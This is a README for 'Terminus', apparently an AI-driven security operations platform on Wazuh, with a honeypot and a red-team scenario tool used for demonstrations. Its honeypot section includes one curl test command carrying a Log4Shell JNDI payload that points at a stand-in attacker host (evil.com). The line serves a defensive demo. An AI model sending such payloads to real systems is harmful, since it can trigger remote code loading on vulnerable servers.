# Terminus — Commercial AI Security Operations & Autonomous Incident Response

[![Python 3.12](https://img.shields.io/badge/python-3.12+-blue.svg)](https://www.python.org/downloads/)
[![FastAPI](https://img.shields.io/badge/FastAPI-0.115+-009688.svg)](https://fastapi.tiangolo.com)
[![Pytest](https://img.shields.io/badge/pytest-passing-brightgreen.svg)](https://docs.pytest.org/)
[![License](https://img.shields.io/badge/license-MIT-green.svg)](LICENSE)

**Terminus** is an enterprise-grade, multi-tenant AI Security Operations Center (SOC) platform built on top of **Wazuh SIEM**. It pairs a deterministic, sub-millisecond policy engine with autonomous AI investigation agents to triage alerts, collect forensic evidence, render severity verdicts, and dispatch automated notifications—eliminating low-level alert fatigue while keeping human analysts in control.

---

## Key Features

- **Autonomous AI Investigation Agent**: Evaluates security alert context using LLM engines (Groq, OpenAI, Ollama, or local vLLM) and produces structured, typed verdicts with forensic summaries and confidence scores.
- **Sub-Millisecond Policy Rules Engine**: Pure deterministic triage before calling LLM APIs:
  - **Level < 5**: `IGNORE` (Filters out noise with zero token cost).
  - **Level 5–9**: `TRIAGE` (Investigates alert and logs incident ticket).
  - **Level ≥ 10**: `ESCALATE` (Executes containment workflows and triggers high-priority alerts).
- **Multi-Tenant SaaS Architecture**: Complete tenant isolation keyed by `OrgId`, supporting Role-Based Access Control (`OWNER`, `ADMIN`, `MEMBER`) and seat limit enforcement.
- **Cryptographic Licensing & Entitlements**: HMAC-SHA256 signed license tokens with tamper detection and feature entitlement checks across `COMMUNITY`, `PRO`, and `ENTERPRISE` tiers.
- **Multi-Channel Notification Fan-Out**: Asynchronous dispatchers supporting stdout logging, Slack Webhooks, and Twilio SMS.
- **Enterprise Dark-Mode Console**: High-density Palo Alto & SOC Command Center dashboard featuring live traffic insight charts, real-time ticket polling, SIEM ingestion guides, and tenant management views.
- **Standalone Red Team Opposer Appliance**: An isolated adversary testing harness (`opposer/`) running on port `8080` with pre-configured CVE threat vectors (Log4Shell, Spring4Shell, Ransomware, LSASS Dump, SSH Brute Force, Kerberoasting).
- **Lightweight Native Python Honeypot**: Zero-dependency Python target server (`honeypot/`) running on port `5000` that inspects real HTTP traffic and forwards live threat alerts to Terminus in real time.

---

## Architecture Overview

```
                      ┌──────────────────────────────────────────────────┐
                      │  RAW TELEMETRY / ATTACK TRAFFIC                  │
                      └────────────────────────┬─────────────────────────┘
                                               │
                                               ▼
                      ┌──────────────────────────────────────────────────┐
                      │  NATIVE HONEYPOT (PORT 5000) / WAZUH SIEM        │
                      └────────────────────────┬─────────────────────────┘
                                               │ POST /wazuh (SiemAlert JSON)
                                               ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│ TERMINUS ENGINE (PORT 8000)                                                            │
│                                                                                        │
│   ┌───────────────────────────┐         ┌───────────────────────────┐                  │
│   │   DETERMINISTIC POLICY    │ ──────> │    AI INVESTIGATION      │                  │
│   │   RULES ENGINE (Fast)     │         │    AGENT (LLM Reasoning)  │                  │
│   └───────────────────────────┘         └─────────────┬─────────────┘                  │
│                                                       │                                │
│                                                       ▼                                │
│   ┌───────────────────────────┐         ┌───────────────────────────┐                  │
│   │   TICKET STORE            │ <────── │   MULTI-CHANNEL NOTIFIER  │                  │
│   │   (Memory / DB)           │         │   (Slack / SMS / Log)     │                  │
│   └─────────────┬─────────────┘         └───────────────────────────┘                  │
└─────────────────┼──────────────────────────────────────────────────────────────────────┘
                  │ Live REST API Polling (/incidents)
                  ▼
┌────────────────────────────────────────────────────────────────────────────────────────┐
│ ENTERPRISE ANALYST CONSOLE (http://localhost:8000/dashboard)                           │
└────────────────────────────────────────────────────────────────────────────────────────┘
```

---

## Quick Start

### 1. Installation

Ensure Python 3.12+ and `uv` package manager are installed:

```bash
git clone https://github.com/your-org/terminus.git
cd terminus
uv sync
```

### 2. Launch Core Terminus Defense Platform

Start the main product API server and Analyst Dashboard on **Port 8000**:

```bash
uv run terminus-serve
```

Access the **Analyst Command Center**: [http://localhost:8000/dashboard](http://localhost:8000/dashboard)

---

## Testing & Red Team Demonstration

Terminus includes two standalone tools for live end-to-end demonstrations:

### Option A: Native Honeypot Target Service (Port 5000)

Launch a lightweight, zero-dependency Python honeypot server:

```bash
python honeypot/main.py
```

Hit the honeypot directly to trigger real threat detection:
```bash
curl "http://localhost:5000/api/search?q=\${jndi:ldap://evil.com/a}"
```
The honeypot will inspect the request, format a SIEM alert payload, and forward it to Terminus (`/wazuh`). Watch the incident populate live on your dashboard!

### Option B: Standalone Red Team Opposer Appliance (Port 8080)

Launch the isolated Opposer Red Team testing GUI:

```bash
python opposer/main.py
```

Access the Opposer GUI at [http://localhost:8080](http://localhost:8080). Select any CVE scenario and click **Execute All Scenarios** to fire threat vectors to your target.

---

## Development & Verification

Run the comprehensive automated test suite (44 passing tests):

```bash
# Run pytest test suite
uv run pytest

# Run linting and type checks
uv run ruff check
uv run basedpyright
```

---

## Directory Structure

```
terminus/
├── src/terminus/            # Core Terminus Python package
│   ├── agent/               # AI Investigation Agent & Evidence Collector
│   ├── auth/                # Session Tokens & Timing-Safe Password Hashing
│   ├── core/                # Value Objects, IDs, and Base Exceptions
│   ├── licensing/           # HMAC Cryptographic License Token Engine
│   ├── llm/                 # OpenAI-Compatible LLM Client & Verdict Parser
│   ├── notifiers/           # Slack, Twilio SMS, and Log Notifier Fan-out
│   ├── orgs/                # Multi-tenant SaaS Organization & Seat Management
│   ├── pipeline/            # End-to-End Pipeline Deployment & Runner
│   ├── policies/            # Sub-millisecond Policy Rules Engine
│   ├── server/              # FastAPI Application, Routers & Dashboard Static HTML
│   ├── siem/                # Wazuh SIEM Client Adapters
│   └── ticketing/           # Ticket Store Persistence Layer
├── opposer/                 # Standalone Red Team Opposer Appliance (Port 8080)
├── honeypot/                # Native Python Honeypot Target Service (Port 5000)
├── tests/                   # Pytest Test Suite
├── pyproject.toml           # Package Dependencies & Tooling Configuration
└── README.md                # Platform Documentation
```

---

## License

Commercial Enterprise SaaS Software. Proprietary & Confidential.
